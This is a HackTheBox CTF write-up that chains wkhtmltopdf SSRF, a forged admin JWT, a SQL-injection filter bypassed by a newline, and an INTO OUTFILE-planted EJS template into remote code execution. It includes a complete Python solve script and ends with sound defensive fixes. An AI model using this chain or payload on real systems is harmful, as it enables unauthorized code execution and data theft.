---
title: "Blueprint Heist"
date: 2027-10-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, jwt, sqli, ssti, wkhtmltopdf, graphql, rce]
description: "An Easy web challenge that only falls to a four-link chain: a wkhtmltopdf URL-to-PDF SSRF that reaches an internal GraphQL API from localhost, a forged admin JWT, a SQL-injection filter bypassed with a single newline, and an INTO OUTFILE write that plants a missing EJS error template for server-side template-injection RCE."
---

## Overview

`Blueprint Heist` is an Easy HackTheBox **Web** challenge — a Node/Express app that turns a submitted URL into a PDF with the EOL renderer **wkhtmltopdf 0.12.5**. No single bug gets the flag; four chain together. We use the PDF renderer as a [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html) primitive to reach an admin-only GraphQL endpoint *from localhost*, forge an admin JWT with a leaked signing secret, slip a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) past a denylist regex using a newline, and use `INTO OUTFILE` to write a **missing** EJS error template — turning the next 404 into [server-side template injection](https://cwe.mitre.org/data/definitions/1336.html) and code execution that runs the SUID `/readflag`.

## The technique

The app exposes three relevant routes:

- `GET /getToken` — hands out a guest JWT (`role: user`).
- `POST /download` — feeds your `url` straight into `wkhtmltopdf(url)` and returns the PDF.
- `/graphql` and `/admin` — require **both** `role: admin` **and** `checkInternal(req)`, where:

```js
function checkInternal(req) {
  const address = req.socket.remoteAddress.replace(/^.*:/, '')
  return address === "127.0.0.1"
}
```

The GraphQL resolver builds SQL by string interpolation, as MySQL **root**, behind a denylist:

```js
const re = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'",.<>\/?]/;   // no m flag -> first line only
if (re.test(name)) return error('bad');
conn.query(`SELECT * FROM users WHERE name like '%${name}%'`);
```

Four observations make the chain:

1. **`wkhtmltopdf` runs on the server.** Point `/download` at `http://127.0.0.1:1337/graphql?...` and the request's `remoteAddress` is `127.0.0.1`, so `checkInternal` passes. IP-based "internal only" trust is forgeable by any on-box SSRF. (wkhtmltopdf 0.12.5 also follows a `30x` redirect to `file://`, the classic local-file read used to leak `/app/.env`.)
2. **The JWT secret lives in `/app/.env`** (`secret=...`). With it we sign `{"role":"admin"}`. A neat oracle to confirm a stolen HS256 secret without server cooperation: hit `/graphql` directly with the forged token from your own IP — a *valid* admin token returns **403** ("Only available for internal users", i.e. the role check passed but `checkInternal` failed), a *bad* signature returns **401**. 403 means the key is right.
3. **The denylist is single-line.** The regex has no `m` flag and JavaScript's `.` never matches a newline, so `^.*` only scans the first line. Prefix the payload with `\n` and every blocked character lands on line 2, invisible to the filter.
4. **A referenced template is missing.** `renderError` renders `views/errors/<status>.ejs`, falling back to `error.ejs` when the file is absent — and `404.ejs` does not exist. A `UNION ... INTO OUTFILE '/app/views/errors/404.ejs'` both **creates** the file and arms the sink, so the very next request to a bogus route renders our EJS.

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, jwt, urllib.parse, re

HOST, PORT = sys.argv[1], sys.argv[2]
BASE = f"http://{HOST}:{PORT}"
SECRET = "<leaked-from /app/.env>"        # leak via wkhtmltopdf redirect->file:///app/.env
INTERNAL = "http://127.0.0.1:1337"        # how the server sees itself (SSRF origin)
s = requests.Session(); s.trust_env = False

# 1. guest token (any valid token is enough for /download)
guest = s.get(f"{BASE}/getToken").text.strip()

# 2. forge an admin JWT with the leaked secret
admin = jwt.encode({"role": "admin"}, SECRET, algorithm="HS256")

# 2b. oracle: valid admin from our IP -> 403 internal-only, bad sig -> 401
r = s.get(f"{BASE}/graphql", params={"token": admin, "query": "{getAllData{id}}"})
assert r.status_code == 403, f"secret mismatch ({r.status_code})"

# 3. SQLi: leading \n bypasses the denylist; UNION INTO OUTFILE writes the missing 404.ejs
ejs = "<%= global.process.mainModule.require('child_process').execSync('/readflag').toString() %>"
name = ("\\n' UNION SELECT 0x" + ejs.encode().hex() +
        ",0x32,0x33,0x34 INTO OUTFILE '/app/views/errors/404.ejs'-- -")
gql = '{getDataByName(name:"' + name + '"){id}}'
ssrf = f"{INTERNAL}/graphql?token={admin}&query={urllib.parse.quote(gql)}"
s.post(f"{BASE}/download", params={"token": guest}, data={"url": ssrf}, timeout=60)

# 4. trigger: any 404 now renders our EJS -> runs /readflag
body = s.get(f"{BASE}/this-route-does-not-exist-404").text
print(re.search(r"HTB\{[^}]+\}", body).group(0))
```

Run it against the live instance:

```bash
python3 solve.py <target-host> <target-port>
# HTB{...}
```

The hex-encoded EJS body (`0x...`) keeps the template's own quotes and `<% %>` from colliding with the SQL string delimiters, and the `,0x32,0x33,0x34` pads the `UNION SELECT` to match the 4-column `users` table.

## Why it worked

Every gate trusted the wrong thing. The "internal only" check trusted the network position of the request, which an on-box renderer SSRF controls. The admin gate trusted a JWT signed with a secret that shipped in a world-readable `.env`. The input filter was a denylist — and a single-line anchored regex at that, defeated by a newline. And the database account was MySQL **root** with `FILE` privilege against a writable template directory, so a `SELECT` could write executable code into the app's own view path. The missing-template fallback turned that file write straight into [remote code execution](https://cwe.mitre.org/data/definitions/94.html).

## Fix / defense

- **Never feed user URLs to a server-side renderer.** If unavoidable, disable local-file access (`wkhtmltopdf --disable-local-file-access`), allow-list `http,https`, re-validate after every redirect, and block loopback/RFC1918 targets. Replace EOL engines (wkhtmltopdf/PhantomJS) with a sandboxed headless Chromium.
- **Authorize on identity, not source IP.** `remoteAddress === 127.0.0.1` is meaningless once an SSRF can originate requests on the box.
- **Use parameterized queries.** A denylist regex is the wrong control; if you must filter, anchor the whole string with the multiline/dotall flags or allow-list `[A-Za-z0-9 ]`.
- **Least-privilege the database.** No `root`, no `FILE` privilege, a restrictive `secure_file_priv`, and an application/template directory that the database OS user cannot write — so `INTO OUTFILE` has nowhere to land.
- **Don't keep signing secrets in source.** Rotate them out of `.env` into a secrets manager and out of the deployment artifact.
